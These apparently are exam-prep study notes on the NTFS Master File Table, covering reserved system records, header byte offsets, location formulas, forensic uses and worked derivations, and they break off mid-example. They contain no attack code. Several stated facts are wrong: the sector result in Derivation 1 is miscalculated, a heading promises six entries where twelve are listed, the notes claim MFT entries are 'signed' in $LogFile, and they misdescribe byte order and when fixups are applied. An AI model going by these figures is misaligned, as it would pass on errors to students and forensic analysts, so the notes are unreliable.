# Section 2: Deep Theoretical Analysis & KTU High-Yield Formula Sheet

## 2.1 Hierarchical Breakdown of MFT Operation

The MFT is not a single monolithic file. It is a **self-referential structure** with the following logical hierarchy:

- **Level 0 – The Volume**: An NTFS-formatted partition begins with the **$Boot` sector (sector 0)**, which contains a BPB (BIOS Parameter Block) pointing to the location of the `$MFT`.
- **Level 1 – The MFT File (`$MFT`, record 0)**: This is the master file that contains the file records. It is described by *itself* (its own MFT entry is record 0).
- **Level 2 – MFT File Records**: Each record describes one user/system file. The minimum size is 1024 bytes.
- **Level 3 – Attributes**: Each record contains an *attribute list* describing the file.
- **Level 4 – Attribute Data**: Inside each attribute, either the file's data (resident) or disk cluster addresses (non-resident) are stored.

### 2.1.1 The Six Core System MFT Entries (Reserved Slots)

The first **16 MFT entries** are pre-allocated for system files. For exam purposes, memorize the following:

| MFT Record # | System File | Purpose |
|:---:|:---|:---|
| 0 | `$MFT` | The Master File Table itself |
| 1 | `$MFTMirr` | Backup copy of the first 4 MFT entries (disaster recovery) |
| 2 | `$LogFile` | Journaling log for metadata transactions (NTFS recoverability) |
| 3 | `$Volume` | Volume-level metadata (label, version, NTFS version) |
| 4 | `$AttrDef` | Attribute definitions table (lists all attribute types) |
| 5 | `.` (root directory) | Root of the directory tree |
| 6 | `$Bitmap` | Cluster allocation bitmap (used vs. free clusters) |
| 7 | `$Boot` | Boot sector backup |
| 8 | `$BadClus` | Bad cluster list |
| 9 | `$Secure` | Security descriptors and access control database |
| 10 | `$UpCase` | Unicode uppercase conversion table |
| 11 | `$Extend` | Extension system files (Quota, $UsnJrnl, etc.) |

## 2.2 Anatomy of a Single MFT Entry (1024 bytes)

Each file record is divided into three logical regions:

1. **File Record Header** (48 bytes minimum, often followed by a header extension)
2. **Update Sequence (Fixup Array)** — variable, used for sector-level integrity
3. **Attribute(s)** — variable, terminated by `0xFFFFFFFF` (the end-of-attributes marker)
4. **Unused space** — padding to the 1024-byte boundary

### 2.2.1 Step-by-Step: What Happens When a File is Created on NTFS

1. The NTFS driver locates a **free MFT entry** in `$MFT`.
2. It creates a new file record and assigns it a **File Reference Number** (64-bit value = 48-bit MFT index + 16-bit sequence number).
3. The driver populates the header with magic signature `FILE` (bytes `0x46 0x49 0x4C 0x45`).
4. The fixup array is initialized: 3 words (6 bytes) by default — the *USN value* and the *USN array*.
5. Attribute `$STANDARD_INFORMATION` (`0x10`) is written first with current MACB timestamps.
6. Attribute `$FILE_NAME` (`0x30`) is written with the long and short 8.3 names.
7. Attribute `$DATA` (`0x80`) is written — either **resident** (data < ~700 bytes fits inside the MFT entry) or **non-resident** with a data run list pointing to disk clusters.
8. The *in-use flag* in the header is set (offset 22, bit byte = `0x01`).
9. The change is journaled in `$LogFile` before commit (NTFS write-ahead logging).
10. The bitmap in MFT entry 6 (`$Bitmap`) is updated if cluster allocation is involved.

> [!TIP]
> **Why this matters for forensics**: Even if the actual data clusters are zeroed, the MFT entry may still retain timestamps, original filename, original size, parent directory reference, and security descriptor — all of which are pivotal for legal investigations.

## 2.3 High-Yield KTU Formula Sheet

The table below lists the *offsets, sizes, and formulas* you must memorize for KTU exams. For exam questions, the most commonly tested byte-level constants are highlighted in **bold**.

> [!NOTE]
> All offsets are relative to the **start of the MFT entry**, not the volume.

| Field | Offset (Bytes) | Size (Bytes) | Forensic Significance |
|:---|:---:|:---:|:---|
| **File Signature "FILE"** | **0x00** | **4** | Identifies a valid NTFS file record; 0x46494C45 in little-endian |
| Offset to Update Sequence | 0x04 | 2 | Byte position of the fixup array |
| Size of Update Sequence (in WORDs) | 0x06 | 2 | e.g., 0x0003 = 3 words = 6 bytes (1 USN + 2 sector entries) |
| **LogFile Sequence Number (LSN)** | **0x08** | **8** | Last journaled update to this record |
| **Sequence Number** | **0x10** | **2** | Increments when MFT slot is reused; tracks parent-child relationships |
| Hard Link Count | 0x12 | 2 | Number of directory entries pointing to this file |
| Offset to First Attribute | 0x14 | 2 | Byte offset where attribute list begins |
| **Flags (In-use, Directory)** | **0x16** | **2** | 0x01 = in use, 0x02 = directory, 0x04 = extension record |
| Used Size of Record | 0x18 | 4 | Bytes actually used (excluding trailing unused space) |
| Allocated Size of Record | 0x1C | 4 | Always ≤ 1024 |
| File Reference to Base Record | 0x20 | 8 | Pointer to extension records; 0 if base record |
| Next Attribute ID | 0x28 | 2 | Increments for each new attribute added |
| (MFT Entry ID - 32-bit) | 0x2C | 4 | Index of this MFT entry (debug/extended) |

### 2.3.1 Essential Formulas for Exam Calculations

**Formula 1 — MFT Entry Address on Disk (given entry index):**

$$
\text{Byte\_Offset}_{\text{MFT}} = \text{MFT\_Start\_Cluster} \times \text{Bytes\_Per\_Cluster} + (\text{Entry\_Index} \times \text{Entry\_Size})
$$

**Formula 2 — Fixup Array Length (in bytes):**

$$
\text{Fixup\_Length}_{\text{bytes}} = \text{USN\_Word\_Count} \times 2
$$

**Formula 3 — Total sectors spanned by an MFT entry (for fixup verification):**

$$
\text{Sectors\_Per\_Entry} = \frac{\text{Entry\_Size}}{\text{Bytes\_Per\_Sector}} = \frac{1024}{512} = 2 \text{ sectors}
$$

**Formula 4 — Cluster number of the MFT (read from `$Boot` BPB):**

$$
\text{MFT\_Cluster} = \frac{\text{MFT\_Byte\_Offset}}{\text{Bytes\_Per\_Cluster}}
$$

**Formula 5 — Number of MFT entries in the volume (approximate):**

$$
N_{\text{entries}} \approx \left\lfloor \frac{\text{MFT\_Size\_Bytes}}{1024} \right\rfloor
$$

> [!IMPORTANT]
> **KTU Pitfall Warning**: Do **not** confuse the **MFT entry size (1024 bytes)** with the **MFT entry's *attribute data* size (variable, ≤ ~700 bytes resident)**. A small file can have all of its data embedded *inside* the MFT record — this is called a **resident file**, and it is highly significant because the file content survives cluster-level disk wiping.

## 2.4 Real-World Forensic Utility

In real-world investigations, the MFT is queried for:

- **Timeline reconstruction** using MACB timestamps of all files.
- **Recovery of deleted filenames** (slack space within unused MFT entries).
- **Detection of timestomping** by comparing `$STANDARD_INFORMATION` vs. `$FILE_NAME` timestamps.
- **Identification of alternate data streams (ADS)** — extra `$DATA` attributes beyond the primary one.
- **Tracking lateral movement** by correlating recently modified executables with user profile directories.
- **Validating chain of custody** because MFT entries are signed in `$LogFile`.

> [!TIP]
> Tools like *FTK Imager, Autopsy, Sleuth Kit (`fls`, `icat`, `istat`), and X-Ways Forensics* all parse the MFT. Knowing the byte offsets helps you understand *why* a tool flags a file as suspicious.

---

<!-- SECTION_2_END -->

<!-- SECTION_3_START -->
# Section 3: Step-by-Step Derivations & Analytical Matrix

This section provides exhaustive derivations and worked examples to ensure exam readiness. **No step is skipped** — every algebraic transition is explicitly shown.

## 3.1 Derivation 1: Locating an MFT Entry on the Physical Disk

**Problem (KTU-style)**: Given a 64-GB NTFS volume with cluster size = 4096 bytes, MFT starts at cluster 786432. Compute the byte offset of MFT entry index 27.

### Step 1: Identify the given parameters

$$
\text{Bytes\_Per\_Cluster} = 4096
$$

$$
\text{MFT\_Start\_Cluster} = 786432
$$

$$
\text{Entry\_Index} = 27
$$

$$
\text{Entry\_Size} = 1024 \text{ bytes (default)}
$$

### Step 2: Compute the byte offset of the start of the MFT

$$
\text{MFT\_Byte\_Offset} = \text{MFT\_Start\_Cluster} \times \text{Bytes\_Per\_Cluster}
$$

Substitute the values:

$$
\text{MFT\_Byte\_Offset} = 786432 \times 4096
$$

### Step 3: Compute the product

$$
786432 \times 4096 = 786432 \times (4 \times 1024)
$$

Breaking it into smaller parts:

$$
786432 \times 4 = 3145728
$$

$$
3145728 \times 1024 = 3221225472 \text{ bytes}
$$

So:

$$
\text{MFT\_Byte\_Offset} = 3221225472 \text{ bytes} = 3 \text{ GiB}
$$

### Step 4: Add the offset contributed by the entry index

$$
\text{Entry\_Byte\_Offset} = \text{Entry\_Index} \times \text{Entry\_Size}
$$

$$
\text{Entry\_Byte\_Offset} = 27 \times 1024 = 27648 \text{ bytes}
$$

### Step 5: Combine to get the final absolute byte offset

$$
\text{Final\_Offset} = \text{MFT\_Byte\_Offset} + \text{Entry\_Byte\_Offset}
$$

$$
\text{Final\_Offset} = 3221225472 + 27648 = 3221253120
$$

### Step 6: Convert to physical sector number (if sector size = 512)

$$
\text{Physical\_Sector} = \frac{3221253120}{512} = 6291450
$$

> [!NOTE]
> **Final Answer**: MFT entry 27 resides at absolute byte offset **3,221,253,120** (sector 6,291,450 on a 512-byte-sector disk). This derivation is the canonical KTU Module 1 problem type.

## 3.2 Derivation 2: Fixup Array Integrity Check (Worked Example)

**Background**: NTFS uses a fixup (update sequence) mechanism to detect torn writes or sector corruption. The last 2 bytes of every 512-byte sector in an MFT entry are overwritten with the *USN value* during write. On read, the OS verifies these 2 bytes match the USN, and if not, returns an error.

**Problem**: A 1024-byte MFT entry is read from disk. The fixup array (at offset `0x30`) contains:

$$
\text{USN} = 0x0001, \quad \text{USN\_Array}[0] = 0x4C45, \quad \text{USN\_Array}[1] = 0x4C45
$$

The last 2 bytes of sector 0 (offset 510–511) are currently `0x4C45`. The last 2 bytes of sector 1 (offset 1022–1023) are also `0x4C45`. Is the MFT entry **valid**?

### Step 1: Recall the fixup mechanism

After writing, NTFS replaces the trailing 2 bytes of each sector with the USN value. The original bytes are saved in the USN array. On read:

- Read the trailing 2 bytes of each sector.
- Compare with the USN value.
- If equal: **valid**; restore the original bytes from the USN array.
- If not equal: **torn write detected**; return error.

### Step 2: Compare the trailing bytes of sector 0

$$
\text{Sector0\_Trailing} = 0x4C45
$$

$$
\text{USN} = 0x0001
$$
